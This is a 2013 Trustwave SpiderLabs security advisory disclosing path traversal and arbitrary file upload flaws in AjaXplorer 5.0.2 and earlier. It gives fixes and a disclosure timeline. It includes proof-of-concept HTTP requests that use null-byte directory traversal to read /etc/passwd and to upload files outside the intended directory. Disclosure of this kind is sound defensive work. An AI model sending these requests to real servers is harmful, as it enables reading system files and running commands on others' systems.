@@ -1,0 +1,111 @@
+Trustwave SpiderLabs Security Advisory TWSL2013-027:
+Multiple Vulnerabilities in AjaXplorer
+
+Published: 09/05/13
+Version: 1.0
+
+Vendor: AjaXplorer (http://ajaxplorer.info)
+Product: AjaXplorer
+Version affected: 5.0.2 and prior
+
+Product description:
+AjaXplorer is an open source file sharing platform which relies on PHP and
+the web interface can run on various web server software, such as Apache
+and Nginx.
+
+
+Finding 1: Path Traversal
+*****Credit: Vikas Singhal of Trustwave SpiderLabs
+CVE: CVE-2013-5688
+CWE: CWE-22
+
+A path traversal vulnerability was found in the "edit" functionality of the application.
+This vulnerability may allow an attacker to view files outside the website's root directory.
+
+The following Proof of Concept (PoC) HTTP request illustrates the same.
+
+
+#Request
+1. GET /filemanagers/ajaxplorer/index.php?secure_token=[latest 
+token]&get_action=download&dir=%2F&file=/%00../%00../%00../%00../%00../%00../%00../%00../%00../%00../etc/passwd HTTP/1.1
+
+#Request
+2. GET /filemanagers/ajaxplorer/index.php?secure_token=[latest 
+token]&get_action=get_content&file=/%00../%00../%00../%00../%00../%00../%00../%00../%00../%00../etc/passwd HTTP/1.1
+
+Finding 2: Arbitrary File Upload
+*****Credit: Vikas Singhal of Trustwave SpiderLabs
+CVE: CVE-2013-5689
+CWE: CWE-434
+
+Using the application's upload functionality it was possible to upload
+arbitrary file outside the default directory and execute it. This may allow
+an attacker to execute arbitrary commands on the web server.
+
+Vulnerable HTTP request:
+
+#Request
+1. POST /filemanagers/ajaxplorer/index.php?secure_token=[latest 
+token]&get_action=upload&xhr_uploader=true&dir=/%00../%00../data/ HTTP/1.1
+
+Remediation Steps:
+The vendor has released a fix to address these vulnerabilities.
+Administrators should upgrade to AjaXplorer Core 5.0.3 or later.
+Alternatively, administers can mitigate these vulnerabilities by applying
+Web Application Firewall (WAF) rules.  ModSecurity
+(http://www.modsecurity.org/) has added rules to the commercial rules feed
+for these issues, and WebDefend has protections as well.
+
+
+Vendor Communication Timeline:
+8/29/13 - Vulnerability disclosed
+9/03/13 - Patch released by vendor
+9/05/13 - Advisory published
+
+References
+1. http://ajaxplorer.info/ajaxplorer-core-5-0-3/
+
+About Trustwave:
+Trustwave is the leading provider of on-demand and subscription-based
+information security and payment card industry compliance management
+solutions to businesses and government entities throughout the world. For
+organizations faced with today's challenging data security and compliance
+environment, Trustwave provides a unique approach with comprehensive
+solutions that include its flagship TrustKeeper compliance management
+software and other proprietary security solutions. Trustwave has helped
+thousands of organizations--ranging from Fortune 500 businesses and large
+financial institutions to small and medium-sized retailers--manage
+compliance and secure their network infrastructure, data communications and
+critical information assets. Trustwave is headquartered in Chicago with
+offices throughout North America, South America, Europe, Africa, China and
+Australia. For more information, visit https://www.trustwave.com
+
+About Trustwave SpiderLabs:
+SpiderLabs(R) is the advanced security team at Trustwave focused on
+application security, incident response, penetration testing, physical
+security and security research. The team has performed over a thousand
+incident investigations, thousands of penetration tests and hundreds of
+application security tests globally. In addition, the SpiderLabs Research
+team provides intelligence through bleeding-edge research and proof of
+concept tool development to enhance Trustwave's products and services.
+https://www.trustwave.com/spiderlabs
+
+Disclaimer:
+The information provided in this advisory is provided "as is" without
+warranty of any kind. Trustwave disclaims all warranties, either express or
+implied, including the warranties of merchantability and fitness for a
+particular purpose. In no event shall Trustwave or its suppliers be liable
+for any damages whatsoever including direct, indirect, incidental,
+consequential, loss of business profits or special damages, even if
+Trustwave or its suppliers have been advised of the possibility of such
+damages. Some states do not allow the exclusion or limitation of liability
+for consequential or incidental damages so the foregoing limitation may not
+apply.
+
+________________________________
+
+This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under 
+applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, 
+distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If 
+you received this transmission in error, please immediately contact the sender and destroy the material in its 
+entirety, whether in electronic or hard copy format.
